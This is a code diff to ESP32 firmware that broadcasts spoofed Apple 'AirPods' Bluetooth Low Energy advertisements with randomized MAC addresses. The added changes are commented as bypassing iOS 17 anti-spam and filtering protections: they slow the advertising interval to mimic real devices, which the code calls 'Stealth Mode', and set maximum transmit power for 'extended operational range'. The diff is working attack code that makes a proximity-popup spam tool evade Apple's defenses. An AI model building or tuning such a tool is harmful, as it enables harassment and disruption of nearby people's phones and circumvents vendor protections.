@@ -15,7 +15,8 @@ int device_index = 0;
 
 int selectedPacket = 30; 
 
-uint32_t delayMilliseconds = 1000;
+// iOS 17+ Anti-Spam Bypass: 4-second delay for UI persistence
+uint32_t delayMilliseconds = 4000;
 unsigned long lastPacketTime = 0;
 bool lastButtonState = HIGH;
 
@@ -59,15 +60,20 @@ void setup() {
   Serial.begin(115200);
   delay(2000); 
 
+  // Initialize hardware random seed for accurate MAC generation
+  randomSeed(esp_random());
+
   pinMode(BUTTON_PIN, INPUT_PULLUP);
   
   strip.begin();
-  // Adjust LED brightness (0-255) for optimal power consumption
   strip.setBrightness(1); 
   strip.clear();
   strip.show(); 
 
   NimBLEDevice::init("AirPods");
+  
+  // Maximize TX Power (+9 dBm) for extended operational range
+  NimBLEDevice::setPower(ESP_PWR_LVL_P9); 
   
   NimBLEServer *pServer = NimBLEDevice::createServer();
   pAdvertising = pServer->getAdvertising();
@@ -156,9 +162,11 @@ void loop() {
       NimBLEAdvertisementData oAdvertisementData = getAdvertismentData();
       pAdvertising->setAdvertisementData(oAdvertisementData);
 
-      // Configure broadcast interval (0x20 = max speed/aggressive spoofing)
-      pAdvertising->setMinInterval(0x20); 
-      pAdvertising->setMaxInterval(0x20); 
+      // --- BROADCAST SPEED CONFIGURATION ---
+      // Apple iOS 17.2+ Filter Bypass (Stealth Mode)
+      // 0x140 = Approx. 3-5 packets/sec (Mimics real device behavior)
+      pAdvertising->setMinInterval(0x140); 
+      pAdvertising->setMaxInterval(0x140); 
       
       pAdvertising->start();
       
